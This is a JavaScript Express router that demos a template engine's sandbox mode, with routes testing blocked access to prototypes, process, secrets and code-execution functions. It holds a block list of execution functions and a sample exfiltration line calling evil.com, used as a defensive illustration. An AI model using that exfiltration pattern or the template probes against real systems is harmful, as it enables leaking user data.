import express from 'express';
import nunjucks from '../../../src/index.js';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const VIEWS = path.join(__dirname, '..', 'views');

const renderTemplate = async (template, context, config = {}) => {
  return await nunjucks(template, context, {
    autoescape: true,
    dev: true,
    ide: 'vscode',
    ...config
  });
};

const router = express.Router();

router.get('/', async (req, res) => {
  res.type('html').send(`
<!DOCTYPE html>
<html>
<head>
  <title>Sandbox Demo</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; }
    h1 { color: #2c3e50; }
    h2 { color: #3498db; border-bottom: 2px solid #3498db; padding-bottom: 8px; }
    .test-case { background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 8px; }
    .success { border-left: 4px solid #27ae60; }
    .error { border-left: 4px solid #e74c3c; }
    code { background: #e9ecef; padding: 2px 6px; border-radius: 4px; }
    pre { background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 8px; overflow-x: auto; }
    .nav { margin: 20px 0; }
    .nav a { display: inline-block; padding: 10px 15px; background: #3498db; color: white; border-radius: 5px; margin-right: 10px; text-decoration: none; }
    .nav a:hover { background: #2980b9; }
    .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0; }
    .feature-card { background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #3498db; }
    .feature-card h3 { margin-top: 0; color: #2c3e50; }
    .feature-card p { color: #666; margin-bottom: 10px; }
    .feature-card .badge { display: inline-block; padding: 4px 8px; background: #27ae60; color: white; border-radius: 4px; font-size: 12px; }
  </style>
</head>
<body>
  <h1>Sandbox Mode Demo</h1>

  <div class="nav">
    <a href="/sandbox/test">Test Sandbox</a>
    <a href="/sandbox/allowlist">Allowlist Mode</a>
    <a href="/sandbox/code-execution">Code Execution</a>
    <a href="/sandbox/normal">Normal (No Sandbox)</a>
  </div>

  <h2>New Sandbox Features (2026)</h2>
  <div class="feature-grid">
    <div class="feature-card">
      <h3>1. Dev Warning</h3>
      <p>Shows warning in dev mode when rendering without sandbox</p>
      <span class="badge">New</span>
    </div>
    <div class="feature-card">
      <h3>2. Lazy Sandboxing</h3>
      <p>Proxy-based, no pre-copying - better performance</p>
      <span class="badge">Improved</span>
    </div>
    <div class="feature-card">
      <h3>3. Environment-Aware</h3>
      <p>Blocks Node/Browser/Deno specific dangerous keys</p>
      <span class="badge">New</span>
    </div>
    <div class="feature-card">
      <h3>4. Code Execution Block</h3>
      <p>Blocks setTimeout, eval, fetch, XMLHttpRequest</p>
      <span class="badge">New</span>
    </div>
    <div class="feature-card">
      <h3>5. Allowlist Mode</h3>
      <p>Only allow explicitly whitelisted properties</p>
      <span class="badge">New</span>
    </div>
  </div>

  <h2>About Sandbox</h2>
  <p>Sandbox mode blocks dangerous access in templates:</p>
  <ul>
    <li><code>{{ user.__proto__ }}</code> - Blocked</li>
    <li><code>{{ user.constructor }}</code> - Blocked</li>
    <li><code>{{ process.env.API_KEY }}</code> - Blocked</li>
  </ul>

  <h2>Try It</h2>
  <div class="test-case">
    <a href="/sandbox/test">Click here to test sandbox mode</a>
  </div>

  <h2>Code Example</h2>
  <pre>// Enable sandbox via config
const html = await nunjucks(template, context, { sandbox: true });

// Allowlist mode - only allow specific keys
const html2 = await nunjucks(template, context, {
  sandbox: true,
  sandboxAllowlist: ['user', 'name'],
  sandboxMode: 'allowlist'
});</pre>
</body>
</html>
  `);
});

router.get('/test', async (req, res) => {
  const context = {
    user: {
      name: 'John',
      admin: true,
      data: { secret: 'API_KEY_123' }
    }
  };

  const results = [];

  const tests = [
    { name: 'Normal property', template: '{{ user.name }}', sandbox: false },
    { name: 'Access __proto__ (blocked)', template: '{{ user.__proto__ }}', sandbox: true, expectError: true },
    { name: 'Access constructor (blocked)', template: '{{ user.constructor }}', sandbox: true, expectError: true },
    { name: 'Access toString (blocked)', template: '{{ user.toString }}', sandbox: true, expectError: true },
    { name: 'Access process (Node blocked)', template: '{{ this.process }}', sandbox: true, expectError: true },
    { name: 'Access prototype (blocked)', template: '{{ user.prototype }}', sandbox: true, expectError: true },
  ];

  for (const test of tests) {
    try {
      const result = await renderTemplate(test.template, context, { sandbox: test.sandbox });
      results.push({ name: test.name, result, error: null, blocked: false });
    } catch (e) {
      results.push({ name: test.name, result: null, error: e.message, blocked: true });
    }
  }

  res.type('html').send(`
<!DOCTYPE html>
<html>
<head>
  <title>Sandbox Test Results</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; }
    h1 { color: #2c3e50; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th, td { text-align: left; padding: 12px; border: 1px solid #ddd; }
    th { background: #3498db; color: white; }
    .blocked { background: #fee; color: #c0392b; }
    .allowed { background: #efe; color: #27ae60; }
    a { color: #3498db; }
  </style>
</head>
<body>
  <h1>Sandbox Test Results</h1>
  <p><a href="/sandbox">Back to Sandbox Demo</a></p>

  <table>
    <tr>
      <th>Test</th>
      <th>Result</th>
      <th>Status</th>
    </tr>
    ${results.map(r => `
    <tr>
      <td>${r.name}</td>
      <td>${r.error ? r.error : r.result}</td>
      <td class="${r.blocked ? 'blocked' : 'allowed'}">${r.blocked ? 'BLOCKED' : 'ALLOWED'}</td>
    </tr>
    `).join('')}
  </table>
</body>
</html>
  `);
});

router.get('/normal', async (req, res) => {
  const context = {
    user: {
      name: 'John',
      admin: true
    }
  };

  const results = [];

  const tests = [
    { name: 'Normal property', template: '{{ user.name }}' },
    { name: 'Access __proto__ (DANGEROUS!)', template: '{{ user.__proto__ }}' },
    { name: 'Access constructor', template: '{{ user.constructor }}' },
  ];

  for (const test of tests) {
    try {
      const result = await renderTemplate(test.template, context);
      results.push({ name: test.name, result, error: null });
    } catch (e) {
      results.push({ name: test.name, result: null, error: e.message });
    }
  }

  res.type('html').send(`
<!DOCTYPE html>
<html>
<head>
  <title>Normal Mode (No Sandbox)</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; }
    h1 { color: #e74c3c; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th, td { text-align: left; padding: 12px; border: 1px solid #ddd; }
    th { background: #e74c3c; color: white; }
    .danger { background: #fee; color: #c0392b; }
    a { color: #3498db; }
  </style>
</head>
<body>
  <h1>Normal Mode (No Sandbox)</h1>
  <p><a href="/sandbox">Back to Sandbox Demo</a></p>

  <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
    <strong>Warning:</strong> Without sandbox, templates can access dangerous properties!
  </div>

  <table>
    <tr>
      <th>Test</th>
      <th>Result</th>
      <th>Status</th>
    </tr>
    ${results.map(r => `
    <tr>
      <td>${r.name}</td>
      <td>${r.error ? r.error : r.result}</td>
      <td class="${r.name.includes('__proto__') || r.name.includes('constructor') ? 'danger' : ''}">${r.error ? 'Error' : 'Allowed'}</td>
    </tr>
    `).join('')}
  </table>
</body>
</html>
  `);
});

router.get('/allowlist', async (req, res) => {
  const context = {
    user: { name: 'John', password: 'secret123', admin: true, data: { secret: 'API_KEY' } }
  };

  const results = [];
  const allowlist = ['user', 'name'];

  const tests = [
    { name: 'user.name (allowed)', template: '{{ user.name }}', shouldPass: true },
    { name: 'user.password (blocked)', template: '{{ user.password }}', shouldPass: false },
    { name: 'user.admin (blocked)', template: '{{ user.admin }}', shouldPass: false },
    { name: 'user.data (blocked)', template: '{{ user.data }}', shouldPass: false },
  ];

  for (const test of tests) {
    try {
      const result = await renderTemplate(test.template, context, {
        sandbox: true,
        sandboxAllowlist: allowlist,
        sandboxMode: 'allowlist'
      });
      results.push({ name: test.name, result, error: null, passed: test.shouldPass });
    } catch (e) {
      results.push({ name: test.name, result: null, error: e.message, passed: !test.shouldPass });
    }
  }

  res.type('html').send(`
<!DOCTYPE html>
<html>
<head>
  <title>Allowlist Mode Demo</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; }
    h1 { color: #8e44ad; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th, td { text-align: left; padding: 12px; border: 1px solid #ddd; }
    th { background: #8e44ad; color: white; }
    .passed { background: #d5f4e6; color: #27ae60; }
    .failed { background: #fadbd8; color: #e74c3c; }
    .code { background: #f8f9fa; padding: 15px; border-radius: 8px; font-family: monospace; margin: 15px 0; }
    a { color: #3498db; }
  </style>
</head>
<body>
  <h1>Allowlist Mode Demo</h1>
  <p><a href="/sandbox">Back to Sandbox Demo</a></p>

  <div class="code">
    <strong>Configuration:</strong><br/>
    sandbox: true<br/>
    sandboxAllowlist: ['user', 'name']<br/>
    sandboxMode: 'allowlist'
  </div>

  <p>In allowlist mode, ONLY the specified keys are allowed. Everything else is blocked.</p>

  <table>
    <tr>
      <th>Test</th>
      <th>Result</th>
      <th>Status</th>
    </tr>
    ${results.map(r => `
    <tr>
      <td>${r.name}</td>
      <td>${r.error ? r.error : r.result}</td>
      <td class="${r.passed ? 'passed' : 'failed'}">${r.passed ? '✓ Correct' : '✗ Unexpected'}</td>
    </tr>
    `).join('')}
  </table>

  <h2>How It Works</h2>
  <p>In blocklist mode (default), dangerous keys are blocked but everything else is allowed.<br/>
  In allowlist mode, only explicitly whitelisted keys are allowed.</p>

  <pre>// Blocklist mode (default)
{ sandbox: true }
// Allows: user.name, user.password, user.anything

// Allowlist mode
{ sandbox: true, sandboxAllowlist: ['user', 'name'], sandboxMode: 'allowlist' }
// Allows ONLY: user.name
// Blocks: user.password, user.anything</pre>
</body>
</html>
  `);
});

router.get('/code-execution', async (req, res) => {
  const context = {
    user: {
      setTimeout: () => 'setTimeout',
      setInterval: () => 'setInterval',
      eval: () => 'eval',
      fetch: () => 'fetch',
      xml: new XMLHttpRequest()
    }
  };

  const results = [];

  const tests = [
    { name: 'Access setTimeout (blocked)', template: '{{ user.setTimeout }}', expectError: true },
    { name: 'Access setInterval (blocked)', template: '{{ user.setInterval }}', expectError: true },
    { name: 'Access eval (blocked)', template: '{{ user.eval }}', expectError: true },
    { name: 'Access fetch (blocked)', template: '{{ user.fetch }}', expectError: true },
  ];

  for (const test of tests) {
    try {
      const result = await renderTemplate(test.template, context, { sandbox: true });
      results.push({ name: test.name, result, error: null, blocked: false });
    } catch (e) {
      results.push({ name: test.name, result: null, error: e.message, blocked: true });
    }
  }

  res.type('html').send(`
<!DOCTYPE html>
<html>
<head>
  <title>Code Execution Blocking Demo</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; }
    h1 { color: #c0392b; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th, td { text-align: left; padding: 12px; border: 1px solid #ddd; }
    th { background: #c0392b; color: white; }
    .blocked { background: #fee; color: #c0392b; }
    .allowed { background: #efe; color: #27ae60; }
    a { color: #3498db; }
    .info { background: #e8f4f8; padding: 15px; border-radius: 8px; margin: 15px 0; }
  </style>
</head>
<body>
  <h1>Code Execution Blocking</h1>
  <p><a href="/sandbox">Back to Sandbox Demo</a></p>

  <div class="info">
    <strong>Blocked patterns:</strong> setTimeout, setInterval, setImmediate, requestAnimationFrame,<br/>
    exec, execSync, spawn, spawnSync, eval, Function, fetch, XMLHttpRequest
  </div>

  <table>
    <tr>
      <th>Test</th>
      <th>Result</th>
      <th>Status</th>
    </tr>
    ${results.map(r => `
    <tr>
      <td>${r.name}</td>
      <td>${r.error ? r.error : r.result}</td>
      <td class="${r.blocked ? 'blocked' : 'allowed'}">${r.blocked ? 'BLOCKED' : 'ALLOWED'}</td>
    </tr>
    `).join('')}
  </table>

  <h2>Why Block These?</h2>
  <p>These functions can be used for code injection attacks:</p>
  <ul>
    <li><code>setTimeout('alert(1)', 0)</code> - Timing attack</li>
    <li><code>eval(userInput)</code> - Direct code execution</li>
    <li><code>fetch('http://evil.com?data=' + userData)</code> - Data exfiltration</li>
  </ul>
</body>
</html>
  `);
});

export { router as sandboxRouter };
